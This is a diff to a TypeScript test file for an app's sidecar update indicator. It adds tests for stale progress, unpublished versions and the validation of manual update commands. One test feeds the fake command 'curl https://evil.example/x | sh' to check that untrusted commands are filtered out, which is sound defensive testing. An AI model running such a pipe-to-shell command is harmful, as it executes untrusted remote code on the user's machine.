@@ -1,5 +1,6 @@
 import { describe, expect, test } from "bun:test";
 import {
+  STALE_PROGRESS_MS,
   manualUpdateHint,
   outdatedSidecars,
   pillView,
@@ -66,6 +67,9 @@ describe("pillView", () => {
     const v = pillView([sc({ id: "a" }), sc({ id: "b", name: "desktop" })]);
     expect(v).toMatchObject({ show: true, target: "settings", label: "2 sidecar updates" });
   });
+  test("a version not published yet is not nagged about", () => {
+    expect(pillView([sc({ update_state: { phase: "unavailable", version: "0.10.0" } })]).show).toBe(false);
+  });
   test("shows an install in progress", () => {
     const v = pillView([sc({ update_state: { phase: "downloading", version: "0.10.0" } })]);
     expect(v.show && v.label).toBe("sidecar update · downloading…");
@@ -73,6 +77,13 @@ describe("pillView", () => {
 });
 
 describe("updateProgressLabel", () => {
+  test("an in-progress phase the sidecar stopped reporting goes stale", () => {
+    const now = Date.parse("2026-09-30T12:00:00Z");
+    const fresh = new Date(now - 60_000).toISOString();
+    const old = new Date(now - STALE_PROGRESS_MS - 1).toISOString();
+    expect(updateProgressLabel({ phase: "downloading", at: fresh }, now)).toBe("downloading…");
+    expect(updateProgressLabel({ phase: "downloading", at: old }, now)).toBeNull();
+  });
   test("only for phases that are running", () => {
     expect(updateProgressLabel({ phase: "installing" })).toBe("installing…");
     expect(updateProgressLabel({ phase: "failed" })).toBeNull();
@@ -85,6 +96,13 @@ describe("manualUpdateHint", () => {
   test("the sidecar's own command wins", () => {
     expect(manualUpdateHint(sc({ update_state: { phase: "failed", manual_command: "npm install -g @usejarvis/sidecar@0.10.0" } })))
       .toBe("npm install -g @usejarvis/sidecar@0.10.0");
+  });
+  test("a sidecar-supplied command outside the known shapes is not shown", () => {
+    const hint = manualUpdateHint(sc({ os: "linux", update_state: { phase: "failed", manual_command: "curl https://evil.example/x | sh" } }));
+    expect(hint).not.toContain("evil");
+    expect(hint).toContain("@usejarvis/sidecar@0.10.0");
+    expect(manualUpdateHint(sc({ update_state: { phase: "failed", manual_command: "Quit Jarvis first, then run: npm install -g @usejarvis/sidecar@0.10.0" } })))
+      .toBe("Quit Jarvis first, then run: npm install -g @usejarvis/sidecar@0.10.0");
   });
   test("pins the version this brain ships with", () => {
     expect(manualUpdateHint(sc({ os: "linux" }))).toContain("@usejarvis/sidecar@0.10.0");
